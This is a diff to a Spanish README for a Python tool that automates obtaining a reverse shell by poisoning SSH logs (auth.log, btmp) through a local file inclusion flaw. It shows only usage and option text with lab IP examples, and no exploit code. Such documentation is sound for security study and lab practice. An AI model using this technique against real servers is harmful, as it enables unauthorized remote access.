@@ -2,27 +2,24 @@
 
 [Herramienta](<autopoisonSSH.py>) escrita en **Python** que permite obtener una **Reverse Shell** de forma automatizada mediante el envenenamiento de los logs relacionados con **SSH**, como **auth.log** o **btmp**. Para lograrlo, es necesario contar con una vulnerabilidad de Inclusión Local de Archivos (**LFI** - Local File Inclusion) o de Lectura Arbitraria de Archivos (Arbitrary File Read), lo que permite acceder y manipular dichos registros.
 
-
-
 Las opciones disponibles son las siguientes:
 
 ```
-usage: autoposionSSH.py [-h] -u TARGET_URL -pm TARGET_PARAM -t-ip TARGET_IP -h-ip HOST_IP [-p TARGET_PORT] [-p-ssh TARGET_SSH_PORT] [-l LISTEN_PORT]
+usage: autopoisonSSH.py [-h] -u TARGET_URL -t-ip TARGET_IP -h-ip HOST_IP [-p TARGET_PORT] [-p-ssh TARGET_SSH_PORT] [-l LISTEN_PORT]
 
 ☠️ SSH Log Poisoning with LFI → Automated Reverse Shell ☠️
 
-ej: python3 autopoison.py -u http://172.17.0.2/vuln.php -pm file -t-ip 172.17.0.1 -h-ip 172.17.0.2
+ej: python3 autopoison.py -u "http://172.17.0.2/vuln.php?file" -t-ip 172.17.0.1 -h-ip 172.17.0.2
 
 options:
   -h, --help                                 show this help message and exit
-  -u, --target-url          TARGET_URL       Target web url with PHP vulnerable file - ej: http://172.17.0.2/vuln.php
-  -pm, --target-param       TARGET_PARAM     Target parameter with LFI capability - ej: file
+  -u, --target-url          TARGET_URL       Target web url with PHP vulnerable file - ej: http://172.17.0.2/vuln.php?file
   -t-ip, --target-ip        TARGET_IP        Target IP - ej: 172.17.0.2
   -h-ip, --host-ip          HOST_IP          Host IP - ej: 172.17.0.1
-   
-  -p, --target-port         TARGET_PORT      Target http port                                                         (default =   80)
-  -p-ssh, --target-ssh-port TARGET_SSH_PORT  Target ssh port                                                          (default =   22)
-  -l, --listen-port         LISTEN_PORT      Listen port                                                              (default = 4444)
+                                             
+  -p, --target-port         TARGET_PORT      Target http port                                                              (default =   80)
+  -p-ssh, --target-ssh-port TARGET_SSH_PORT  Target ssh port                                                               (default =   22)
+  -l, --listen-port         LISTEN_PORT      Listen port                                                                   (default = 4444)
 ```
 
 ---
